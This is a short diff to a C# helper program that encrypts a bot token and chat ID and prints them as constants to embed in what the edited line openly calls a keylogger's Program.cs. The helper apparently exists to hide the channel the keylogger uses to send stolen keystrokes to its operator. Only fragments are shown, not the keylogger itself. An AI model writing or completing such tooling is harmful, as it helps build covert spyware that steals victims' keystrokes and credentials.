@@ -1,5 +1,4 @@
-﻿// GenerateCredentials.cs - Compile and run separately
-using System;
+﻿using System;
 using System.IO;
 using System.Security.Cryptography;
 using System.Text;
@@ -34,9 +33,9 @@ namespace CredentialGenerator
             string encryptedToken = EncryptString(botToken);
             string encryptedChatId = EncryptString(chatId);
 
-            Console.WriteLine("Add these to Program.cs:\n");
-            Console.WriteLine($"private const string EncryptedBotToken = \"{encryptedToken}\";");
-            Console.WriteLine($"private const string EncryptedChatId = \"{encryptedChatId}\";");
+            Console.WriteLine("Add these to (keylogger) Program.cs:\n");
+            Console.WriteLine($"EncryptedBotToken = \"{encryptedToken}\";");
+            Console.WriteLine($"EncryptedChatId = \"{encryptedChatId}\";");
         }
 
         private static string EncryptString(string plainText)
